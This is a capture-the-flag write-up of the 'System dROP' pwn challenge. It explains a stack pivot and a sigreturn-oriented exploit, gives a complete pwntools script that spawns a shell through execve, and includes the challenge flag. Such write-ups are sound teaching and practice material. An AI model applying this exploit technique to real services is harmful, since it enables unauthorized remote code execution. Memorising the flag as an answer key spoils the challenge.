# System dROP

## Challenge

We're given a small binary with few useful functions or gadgets, but it is vulnerable to a buffer overflow and contains a syscall gadget.

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## Solution

We don't have functions we can use to leak addressed, but there is no PIE so the address of the binary is known.

We can use the buffer overflow to pivot the stack into the data section of the binary.
From here we can write the `"/bin/sh\x00"` string into a known location in memory, then write a sigreturn frame to set the registers needed to `execve("/bin/sh\x00", NULL, NULL)` and spawn a shell.

## Exploit

```py
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 1337 system_drop
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('system_drop')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'localhost'
port = int(args.PORT or 1337)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

data = 0x601100
read = exe.sym["read"]
rsi_r15 = 0x00000000004005d1
rsp_r13_r14_r15 = 0x00000000004005cd
rdi = 0x00000000004005d3
syscall = 0x000000000040053b

frame = SigreturnFrame(kernel="amd64")
frame.rax = constants.SYS_execve
frame.rdi = data
frame.rsi = 0
frame.rdx = 0 
frame.rip = syscall

payload = flat({
    0x20 + 8: [
        rsi_r15,
        data + 0x100,
        0,
        read,
        rsi_r15,
        data,
        0,
        read,
        rsp_r13_r14_r15,
        data + 0x100 - (3 * 0x8),
        ],
    }).ljust(0x100, b'B')

io.send(payload)
print(len(payload))

io.info("writing frame")
framepayload = flat([
    syscall,
    frame
    ])
io.send(framepayload)
print(len(framepayload))

io.info("writing binsh + rax")
binsh = '/bin/sh\x00'.ljust(15, b'A')

io.send(binsh)

io.interactive()
```

## Flag

`CHTB{n0_0utput_n0_pr0bl3m_w1th_sr0p}`

